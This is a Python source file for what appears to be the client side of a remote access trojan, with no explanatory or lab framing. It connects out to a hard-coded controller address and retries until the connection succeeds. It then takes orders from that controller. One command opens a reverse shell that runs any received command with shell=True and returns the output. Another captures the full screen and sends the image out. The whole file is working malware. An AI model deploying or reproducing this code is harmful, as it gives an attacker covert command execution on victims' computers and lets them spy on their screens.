import socket
import sys
import os
import time
import subprocess
import mss



address = ("0.0.0.0", 3000)

def take_screen_shot():
    if len(mss.mss().monitors) > 0:
        raw_pixels = mss.mss().grab(mss.mss().monitors[0])
        img_data = mss.tools.to_png(raw_pixels.rgb, raw_pixels.size, 0)
        send(img_data)

        del(raw_pixels, img_data)

def recv():
    data_size = int(server_con.recv(12).decode())

    data = bytes()
    while len(data) < data_size:
        data += server_con.recv(1024)

    return data

def send(data):
    header_size = 12
    data_size = f"{len(data):^{header_size}}"
    server_con.send(data_size.encode())
    server_con.sendall(data)

def open_shell():
    while True:
        print("waiting for cmd...")
        data = recv()
        str_msg = ""

        if data.decode() == "exit":
            break
        elif data.decode()[:2] == "cd":
            dir = data.decode()[3:]
            try:
                os.chdir(dir)
            except:
                str_msg = "Error: " + str(sys.exc_info()[0])
            else:
                str_msg = os.getcwd()
        else:
            output = subprocess.Popen(f'{data.decode()}', shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()
            str_msg = output[0].decode()


        send(str_msg.encode())




def establish_connection(address):
    global server_con

    print("Connecting...")
    while True:
        try:
            server_con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            server_con.connect((address[0],address[1]))
            print(f"Connected!\nServer: {address[0]}:{address[1]}")
        except:
            time.sleep(3)
        else:
            break


def main():
    establish_connection(address)

    while True:
        choice = recv().decode()
        if choice == "1":
            print("Opening Shell...")
            open_shell()
        elif choice == "2":
            take_screen_shot()
        elif choice == "6":
            server_con.close()
            time.sleep(5)
            establish_connection(address)

    server_con.close()

main()
